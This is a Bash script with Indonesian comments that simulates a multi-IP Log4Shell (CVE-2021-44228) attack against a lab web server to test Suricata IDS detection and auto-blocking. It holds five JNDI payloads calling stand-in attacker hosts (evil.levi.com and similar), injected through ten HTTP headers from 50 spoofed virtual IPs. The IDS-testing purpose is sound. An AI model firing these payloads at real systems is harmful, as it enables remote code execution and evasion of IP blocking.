#!/usr/bin/env bash
# =============================================================================
#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata IDS
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_sim.sh
#
#  Script ini membuat 50 IP virtual di subnet yang sama dengan target,
#  lalu mengirimkan HTTP request berisi payload Log4Shell (CVE-2021-44228)
#  dari setiap IP. Setiap IP mengirim 5x request agar melewati threshold
#  auto-block di dashboard SuricataEVE.
#
#  PENTING: Pastikan Suricata sudah memiliki ruleset ET (suricata-update)
#           dan dummy_web (Apache) sudah berjalan di port 80.
# =============================================================================

# ── Warna ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET_IP="192.168.216.128"
TARGET_PORT="80"
TARGET="http://${TARGET_IP}:${TARGET_PORT}"

# Deteksi interface jaringan utama secara otomatis
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
[[ -z "$IFACE" ]] && IFACE="eth0"

# IP asli Kali Linux
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -n1)

# Subnet SAMA dengan target — tidak perlu routing tambahan
IP_BASE="192.168.216"
IP_START=100
IP_COUNT=50
HITS_PER_IP=5       # Jumlah request per IP (harus > threshold auto-block)
DELAY=0.05          # Delay antar IP (detik)

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[✓]${NC}    $*"; }
fail()    { echo -e "${RED}[✗]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
            echo -e "${BOLD}${BLUE}  $*${NC}"
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}\n"; }

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && fail "Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1

# ── Cleanup saat EXIT ─────────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan ${IP_COUNT} IP virtual..."
    for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
        ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    done
    success "Semua IP virtual dihapus. Bersih!"
}
trap cleanup EXIT

# ── Banner ────────────────────────────────────────────────────────────────────
header "🔥 SURICATA ATTACK SIMULATOR v2.0"
echo -e "  Target     : ${BOLD}${TARGET}${NC}"
echo -e "  Interface  : ${BOLD}${IFACE}${NC} (IP: ${KALI_IP})"
echo -e "  Virtual IP : ${BOLD}${IP_BASE}.${IP_START} — ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
echo -e "  Request/IP : ${BOLD}${HITS_PER_IP}x${NC}"
echo -e "  Total      : ${BOLD}$((IP_COUNT * HITS_PER_IP)) request${NC}"
echo ""

# ── Pre-Flight Check ──────────────────────────────────────────────────────────
header "0. Pre-Flight Check"

# Cek apakah target bisa di-ping
if ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
    success "Target ${TARGET_IP} reachable (ping OK)"
else
    fail "Target ${TARGET_IP} tidak bisa di-ping!"
    warn "Pastikan Ubuntu Server menyala dan IP benar."
    exit 1
fi

# Cek apakah web server (port 80) menerima koneksi
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "${TARGET}/")
if [[ "$HTTP_CODE" != "000" ]]; then
    success "Web server aktif di port ${TARGET_PORT} (HTTP ${HTTP_CODE})"
else
    fail "Web server TIDAK merespons di port ${TARGET_PORT}!"
    warn "Pastikan container dummy_web sudah jalan:"
    echo -e "  ${BOLD}docker compose up -d dummy_web${NC}"
    exit 1
fi

# Cek apakah Suricata berjalan di server target (opsional)
info "Cek Suricata di target... (pastikan sudah docker compose up -d suricata)"

echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Semua OK. Mulai serangan? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

# ── Langkah 1: Buat IP Virtual ────────────────────────────────────────────────
header "1. Membuat ${IP_COUNT} IP Virtual"

> attackers.txt
CREATED=0
for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
    VIRT_IP="${IP_BASE}.${i}"
    ip addr add "${VIRT_IP}/24" dev "$IFACE" 2>/dev/null
    echo "$VIRT_IP" >> attackers.txt
    CREATED=$((CREATED + 1))
done
success "${CREATED} IP virtual berhasil dibuat (${IP_BASE}.${IP_START} — ${IP_BASE}.$((IP_START + IP_COUNT - 1)))"
info "Daftar IP disimpan ke attackers.txt"
sleep 1

# ── Langkah 2: Kirim Serangan ─────────────────────────────────────────────────
header "2. Memulai Simulasi Serangan (${HITS_PER_IP}x per IP)"

# Variasi header HTTP untuk menyisipkan payload Log4Shell
HEADERS=(
    "User-Agent"
    "X-Api-Version"
    "X-Forwarded-For"
    "Referer"
    "X-Client-IP"
    "X-Real-IP"
    "Accept-Language"
    "Authorization"
    "X-Originating-IP"
    "CF-Connecting-IP"
)

# Variasi payload Log4Shell — semua mengandung pattern ${jndi: yang dideteksi Suricata
PAYLOADS=(
    '${jndi:ldap://evil.levi.com/exploit}'
    '${jndi:ldap://attacker.levi.com/a}'
    '${jndi:rmi://malicious.levi.com/obj}'
    '${jndi:dns://callback.levi.com}'
    '${jndi:ldap://log4shell.levi.com/x}'
)

# Variasi URL path agar setiap request terlihat unik di log
PATHS=(
    "/"
    "/index.php"
    "/login"
    "/admin"
    "/api/v1/users"
    "/search?q=test"
    "/wp-login.php"
    "/console"
    "/.env"
    "/actuator/health"
)

TOTAL_SENT=0
TOTAL_OK=0
TOTAL_BLOCKED=0

echo ""
for i in $(seq 0 $((IP_COUNT - 1))); do
    SRC_IP="${IP_BASE}.$((IP_START + i))"

    # Pilih header dan payload berbeda untuk setiap IP
    HDR="${HEADERS[$((i % ${#HEADERS[@]}))]}"
    PLD="${PAYLOADS[$((i % ${#PAYLOADS[@]}))]}"

    BLOCKED=false
    for hit in $(seq 1 $HITS_PER_IP); do
        PATH_TARGET="${PATHS[$(( (i + hit) % ${#PATHS[@]} ))]}"

        HTTP_RESULT=$(curl -s --max-time 3 --connect-timeout 2 \
            --interface "$SRC_IP" \
            -H "${HDR}: ${PLD}" \
            -o /dev/null -w "%{http_code}" \
            "${TARGET}${PATH_TARGET}" 2>/dev/null)

        TOTAL_SENT=$((TOTAL_SENT + 1))

        if [[ "$HTTP_RESULT" == "000" ]]; then
            BLOCKED=true
            TOTAL_BLOCKED=$((TOTAL_BLOCKED + 1))
            break
        else
            TOTAL_OK=$((TOTAL_OK + 1))
        fi
    done

    if $BLOCKED; then
        echo -e "${RED}[ATK]${NC} ${SRC_IP} → ${HITS_PER_IP}x ${HDR} → ${GREEN}DIBLOKIR! ✓${NC}"
    else
        echo -e "${RED}[ATK]${NC} ${SRC_IP} → ${HITS_PER_IP}x ${HDR} → selesai (HTTP ${HTTP_RESULT})"
    fi

    sleep "$DELAY"
done

# ── Ringkasan ─────────────────────────────────────────────────────────────────
header "✅ Simulasi Selesai!"

echo -e "  ${BOLD}Total IP penyerang${NC}  : ${IP_COUNT}"
echo -e "  ${BOLD}Total request${NC}       : ${TOTAL_SENT}"
echo -e "  ${BOLD}Request berhasil${NC}    : ${TOTAL_OK}"
echo -e "  ${BOLD}IP terblokir${NC}        : ${GREEN}${TOTAL_BLOCKED}${NC}"
echo ""

# Simpan metadata eksperimen
info "Menyimpan attack_metadata.json..."
cat <<EOF > attack_metadata.json
{
  "test_date": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')",
  "attack_type": "Log4Shell CVE-2021-44228 via HTTP Headers",
  "total_attackers": ${IP_COUNT},
  "hits_per_ip": ${HITS_PER_IP},
  "total_requests": ${TOTAL_SENT},
  "requests_ok": ${TOTAL_OK},
  "ips_blocked": ${TOTAL_BLOCKED},
  "target_ip": "${TARGET_IP}",
  "target_port": "${TARGET_PORT}",
  "headers_used": ["User-Agent","X-Api-Version","X-Forwarded-For","Referer","X-Client-IP","X-Real-IP","Accept-Language","Authorization","X-Originating-IP","CF-Connecting-IP"],
  "payload_variants": 5,
  "suricataeve_version": "1.0"
}
EOF
success "Metadata eksperimen disimpan ke attack_metadata.json"

echo ""
echo -e "  ${GREEN}➜${NC} Buka Dashboard : ${BOLD}http://${TARGET_IP}:8080${NC}"
echo -e "  ${GREEN}➜${NC} Cek log        : ${BOLD}tail -f ~/SuricataEVE/logs/eve.json${NC}"
echo -e "  ${GREEN}➜${NC} Cek blocked    : ${BOLD}cat ~/SuricataEVE/auto_block/blocked_ips.log${NC}"
echo ""
